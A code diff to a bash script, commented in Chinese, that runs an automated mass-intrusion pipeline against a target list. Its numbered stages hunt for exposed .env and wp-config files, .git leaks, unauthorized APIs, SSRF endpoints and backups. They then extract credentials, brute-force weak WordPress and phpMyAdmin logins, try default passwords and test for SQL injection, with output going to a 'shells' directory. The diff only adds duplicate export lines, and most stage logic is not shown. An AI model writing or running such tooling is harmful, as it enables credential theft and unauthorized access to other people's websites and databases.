@@ -86,6 +86,7 @@ echo "  ✅ Upload Shell: $UPLOAD"
 # ==========================================
 export OUT
 echo "[2/8] 📁 敏感文件（内容验证，并发20）..."
+export OUT
 cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     url="{}"
     
@@ -141,6 +142,7 @@ echo "  ✅ 敏感文件: $FILES (.env:$ENV config:$CONFIG wp-config:$WPCONFIG g
 # ==========================================
 export OUT
 echo "[3/8] 🌐 未授权API（数据验证，并发20）..."
+export OUT
 cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     url="{}"
     
@@ -171,6 +173,7 @@ echo "  ✅ 未授权API: $API"
 # ==========================================
 export OUT
 echo "[4/8] 🔓 Git泄露（多重验证，并发30）..."
+export OUT
 cat $OUT/targets.txt | xargs -P 30 -I {} bash -c '
     url="{}"
     
@@ -195,6 +198,7 @@ echo "  ✅ Git泄露: $GIT_LEAK"
 # ==========================================
 export OUT
 echo "[5/8] 🎯 WordPress（多重检测，并发30）..."
+export OUT
 cat $OUT/targets.txt | xargs -P 30 -I {} bash -c '
     url="{}"
     resp=$(curl -skL -m 4 "$url" 2>/dev/null)
@@ -218,6 +222,7 @@ echo "  ✅ WordPress: $WP"
 # ==========================================
 export OUT
 echo "[6/8] 🔓 phpMyAdmin（登录页面验证，并发30）..."
+export OUT
 cat $OUT/targets.txt | xargs -P 30 -I {} bash -c '
     url="{}"
     
@@ -241,6 +246,7 @@ echo "  ✅ phpMyAdmin: $PMA"
 # ==========================================
 export OUT
 echo "[7/8] 🔗 SSRF端点（元数据验证，并发15）..."
+export OUT
 cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
     url="{}"
     
@@ -270,6 +276,7 @@ echo "  ✅ SSRF: $SSRF"
 # ==========================================
 export OUT
 echo "[8/8] 💾 备份文件（内容验证，并发20）..."
+export OUT
 cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     url="{}"
     domain=$(echo "$url" | sed "s|https\?://||" | cut -d/ -f1 | cut -d: -f1)
@@ -346,6 +353,7 @@ echo "  ✅ 提取凭证: env:$ENV_PASS config:$CONFIG_PASS wp:$WP_PASS"
 # ==========================================
 export OUT
 echo "[10/14] 🔓 WordPress弱口令（增强字典，并发10）..."
+export OUT
 [ -f $OUT/shells/05_wordpress.txt ] && cat $OUT/shells/05_wordpress.txt | head -100 | xargs -P 10 -I {} bash -c '
     url="{}"
     wp_login="${url}/wp-login.php"
@@ -400,6 +408,7 @@ echo "  ✅ WordPress凭证: $WP_CREDS"
 # ==========================================
 export OUT
 echo "[11/14] 🔓 phpMyAdmin弱口令（增强字典，并发10）..."
+export OUT
 [ -f $OUT/shells/06_phpmyadmin.txt ] && cat $OUT/shells/06_phpmyadmin.txt | head -50 | xargs -P 10 -I {} bash -c '
     url="{}"
     base_url=$(echo "$url" | sed "s|/pma.*||" | sed "s|/phpmyadmin.*||")
@@ -463,6 +472,7 @@ echo "  ✅ phpMyAdmin凭证: $PMA_CREDS"
 # ==========================================
 export OUT
 echo "[12/14] 🔑 默认凭证检测（API/后台，并发20）..."
+export OUT
 cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     url="{}"
     
@@ -492,6 +502,7 @@ echo "  ✅ 默认凭证: $DEFAULT_CREDS_COUNT"
 # ==========================================
 export OUT
 echo "[13/14] 💉 SQL注入检测（布尔+时间+报错+联合，并发15）..."
+export OUT
 cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
     url="{}"
     
